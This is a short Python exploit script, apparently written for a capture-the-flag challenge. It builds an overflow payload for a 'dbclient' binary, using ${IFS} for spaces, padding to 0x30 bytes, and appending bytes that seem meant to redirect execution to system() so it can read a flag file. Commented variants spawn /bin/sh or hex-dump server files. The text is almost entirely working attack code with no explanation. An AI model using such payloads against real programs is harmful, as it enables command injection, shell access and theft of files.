# oldaddr = 0x401af6
# system = 0x400a60

newaddr = 0x402a60

SPACE = "${IFS}"
# payload = "/bin/sh" + SPACE
payload = "cat" + SPACE + "/home/ben/.flag.advanced" + SPACE
# payload = "stat" + SPACE + "/home/ben/srv*" + SPACE
# payload = "od" + SPACE + "-vtx1" + SPACE + "/home/ben/srv*" + SPACE
payload = payload.ljust(0x30, "A")
payload += "fJJ"
payload += "BBBBBBBBB"

print("./dbclient \"" + payload.replace("$", "\\$") + "\" aa")
# print payload

# cat logfile | cut -d" " -f2- | xxd -r -g 1 -p1 > srv_copy
